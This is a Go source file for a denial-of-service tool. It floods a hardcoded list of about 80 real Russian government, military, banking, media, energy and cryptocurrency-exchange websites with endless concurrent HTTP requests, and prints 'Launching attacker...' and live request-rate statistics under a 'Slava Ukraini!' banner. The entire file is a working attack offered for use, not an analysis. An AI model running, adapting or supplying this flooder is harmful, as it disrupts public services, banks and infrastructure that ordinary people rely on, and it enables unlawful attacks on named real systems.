package main

import (
	"fmt"
	"runtime"
	"sync/atomic"
	"time"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

var client = fasthttp.Client{MaxConnsPerHost: 999999}
var count uint64
var errors uint64

var urls = []string{
	"https://lenta.ru/",
	"https://ria.ru/",
	"https://ria.ru/lenta/",
	"https://www.rbc.ru/",
	"https://www.rt.com/",
	"http://kremlin.ru/",
	"http://en.kremlin.ru/",
	"https://smotrim.ru/",
	"https://tass.ru/",
	"https://tvzvezda.ru/",
	"https://vsoloviev.ru/",
	"https://www.1tv.ru/",
	"https://www.vesti.ru/",
	"https://online.sberbank.ru/",
	"https://sberbank.ru/",
	"https://zakupki.gov.ru/",
	"https://www.gosuslugi.ru/",
	"https://er.ru/",
	"https://www.rzd.ru/",
	"https://rzdlog.ru/",
	"https://vgtrk.ru/",
	"https://www.interfax.ru/",
	"https://www.mos.ru/uslugi/",
	"http://government.ru/",
	"https://mil.ru/",
	"https://www.nalog.gov.ru/",
	"https://customs.gov.ru/",
	"https://pfr.gov.ru/",
	"https://rkn.gov.ru/",
	"https://www.gazprombank.ru/",
	"https://www.vtb.ru/",
	"https://www.gazprom.ru/",
	"https://lukoil.ru/",
	"https://magnit.ru/",
	"https://www.nornickel.com/",
	"https://www.surgutneftegas.ru/",
	"https://www.tatneft.ru/",
	"https://www.evraz.com/ru/",
	"https://nlmk.com/",
	"https://www.sibur.ru/",
	"https://www.severstal.com/",
	"https://www.metalloinvest.com/",
	"https://nangs.org/",
	"https://rmk-group.ru/ru/",
	"https://www.tmk-group.ru/",
	"https://ya.ru/",
	"https://www.polymetalinternational.com/ru/",
	"https://www.uralkali.com/ru/",
	"https://www.eurosib.ru/",
	"https://ugmk.ua/",
	"https://omk.ru/",
	"https://www.roscosmos.ru/",
	"https://tass.com/",
	"https://russia-insider.com/",
	"https://www.pravda.ru/",
	"http://rosneft.ru",
	"https://www.rostec.ru/",
	"https://rosim.gov.ru/",
	"https://x5.ru/",
	"https://www.rosseti.ru/",
	"https://www.interrao.ru/",
	"https://www.transneft.ru/",
	"https://rosatom.ru/",
	"https://rusal.ru/",
	"https://www.nornickel.ru/",
	"http://www.uacrussia.ru/",
	"https://cleanbtc.ru/",
	"https://bonkypay.com/",
	"https://mine.exchange/",
	"https://coinpaymaster.com/",
	"https://www.netex24.net",
	"https://cashbank.pro/",
	"https://abcobmen.com/",
	"https://ychanger.net/",
	"https://multichange.net/",
	"https://24paybank.ne",
	"https://royal.cash/",
	"https://prostocash.com/",
	"https://baksman.org/",
}

func main() {
	cpus := runtime.NumCPU()
	runtime.GOMAXPROCS(cpus)

	for i := 0; i < cpus*10; i++ {
		for _, url := range urls {
			go func(url string) {
				for {
					sendRequest(url)
					atomic.AddUint64(&count, 1)
				}
			}(url)
		}
	}

	fmt.Println("Launching attacker...")

	startTime := time.Now()

	for {
		time.Sleep(500 * time.Millisecond)

		timeElapsed := float64(time.Since(startTime).Round(1*time.Second)) / 1000000000

		fmt.Print("\033[H\033[2J")
		fmt.Println(color.Cyan.Render("Slava ") + color.Yellow.Render("Ukraini!") + "\n")
		fmt.Print("Requests/s: ")
		color.Yellow.Printf("%d\n", uint64(float64(count)/timeElapsed))
		fmt.Print("Total requests: ")
		color.Yellow.Printf("%d\n", count)
		fmt.Print("Successfull requests: ")
		color.Green.Printf("%d\n", count-errors)
		fmt.Print("Successfull requests/s: ")
		color.Green.Printf("%d\n", uint64(float64(count-errors)/timeElapsed))
		fmt.Print("Errors: ")
		color.Red.Printf("%d\n", errors)
		fmt.Print("Time elapsed: ")
		fmt.Println(color.Cyan.Render(time.Since(startTime).Round(1 * time.Second)))
	}
}

func sendRequest(host string) {
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(host)
	res := fasthttp.AcquireResponse()

	err := client.Do(req, res)

	if err != nil {
		atomic.AddUint64(&errors, 1)
	}

	fasthttp.ReleaseRequest(req)
}
